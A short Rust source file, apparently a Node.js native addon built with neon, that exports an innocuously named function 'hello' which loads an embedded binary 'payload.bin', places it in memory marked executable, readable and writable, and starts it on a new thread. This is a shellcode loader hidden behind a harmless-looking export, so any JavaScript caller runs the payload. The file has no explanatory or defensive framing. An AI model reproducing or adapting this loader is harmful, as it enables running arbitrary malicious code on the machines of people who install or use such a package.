use winapi::um::memoryapi::VirtualAlloc;
use winapi::um::processthreadsapi::CreateThread;
use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE};
use std::ptr::null_mut;

#[neon::export]
fn hello()  {
    let x64shellcode: &[u8] =  include_bytes!("payload.bin");


    unsafe {
        let func_addr = VirtualAlloc(
            null_mut(),
            x64shellcode.len(),
            MEM_COMMIT|MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        );
        std::ptr::copy_nonoverlapping(x64shellcode.as_ptr(), func_addr as *mut u8, x64shellcode.len());

        let mut thread_id: u32 = 0;
        let _h_thread = CreateThread(
            null_mut(),
            0,
            Some(std::mem::transmute(func_addr)),
            null_mut(),
            0,
            &mut thread_id as *mut u32,
        );

        // WaitForSingleObject(h_thread, 0xFFFFFFFF);
    }
}